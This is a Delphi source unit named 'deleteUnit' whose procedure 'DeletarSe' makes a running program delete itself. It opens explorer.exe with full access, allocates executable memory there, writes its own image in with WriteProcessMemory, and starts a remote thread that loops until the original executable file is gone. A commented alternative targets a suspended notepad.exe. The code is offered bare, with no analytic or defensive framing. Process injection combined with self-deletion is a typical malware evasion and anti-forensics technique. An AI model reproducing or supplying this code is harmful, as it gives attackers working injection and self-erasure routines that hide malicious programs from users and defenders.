unit deleteUnit;
{$IMAGEBASE $14000000}

interface

uses
  Windows;

procedure DeletarSe;

implementation

type
  TRemoteStruct = packed record
    FileName: PChar;
  end;
  PRemoteStruct = ^TRemoteStruct;

procedure InjectedProcedure(RemoteStruct: PRemoteStruct); stdcall;
begin
  while DeleteFile(RemoteStruct.FileName) = false do sleep(100);
end;

function Inject(hProcess: longword; pData: pointer; dSize: DWORD): pointer;
var
  dBytesWritten ,
  dOldProtect   :DWORD;
begin
  Result := VirtualAllocEx(hProcess, nil, dSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  VirtualProtectEx(hProcess, Result, dSize, PAGE_EXECUTE_READWRITE, dOldProtect);
  if Result <> nil then
  if not WriteProcessMemory(hProcess, Result, pData, dSize, dBytesWritten) then Result := nil;
end;

function InjectIntoProcess(hProc : Cardinal; pFunctionToInject, RemoteStructAddr: Pointer) : Pointer;
var
  pdosheader   : PIMAGEDOSHEADER;
  pntheader    : PIMAGENTHEADERS;
  dwsize       : DWORD;
  dwimagebase  : DWORD;
  bw : Cardinal;
  ThreadId : Cardinal;
  pRemoteBase : Pointer;
begin
  result := 0;
  pdosheader  := Pointer(GetModuleHandle(0));
  pntheader   := Pointer(Cardinal(pdosheader) + pdosheader^._lfanew);
  dwsize      := pntheader^.OptionalHeader.SizeOfImage;
  dwimagebase := pntheader^.OptionalHeader.ImageBase;

  VirtualFreeEx(hProc, Pointer(dwimagebase),0,MEM_RELEASE);
  pRemoteBase := VirtualAllocEx(hProc,Pointer(dwimagebase),dwsize,MEM_COMMIT OR MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  if (Cardinal(pRemoteBase) = 0) Then  exit; //imagebase schon belegt, relocation nötig ;)
  WriteProcessMemory(hProc,Pointer(dwimagebase),Pointer(GetModuleHandle(0)),dwsize,bw);
  if bw < dwsize Then exit;
  CreateRemoteThread(hProc,0,0,pFunctionToInject,RemoteStructAddr,0,ThreadId);
  CloseHandle(hProc);
  result := pRemoteBase;
end;

procedure deletarse;
var
  ProcessHandle, PID: longword;
  RemoteStruct :TRemoteStruct;
  RemoteStructAddr: pointer;
  FileName: pchar;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;
begin
  FileName := pchar(paramstr(0));

  GetWindowThreadProcessID(FindWindow('Shell_TrayWnd', nil), @PID);  //explorer.exe
  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, PID);

  //ZeroMemory(@StartInfo, SizeOf(StartupInfo));
  //CreateProcess(nil, pchar('notepad.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
  //processhandle := ProcInfo.hProcess;

  RemoteStruct.FileName := Inject(ProcessHandle, Pchar(FileName), Length(FileName));
  RemoteStructAddr := Inject(ProcessHandle, @RemoteStruct, SizeOf(TRemoteStruct));

  InjectIntoProcess(processhandle, @InjectedProcedure, RemoteStructAddr);
end;

end.
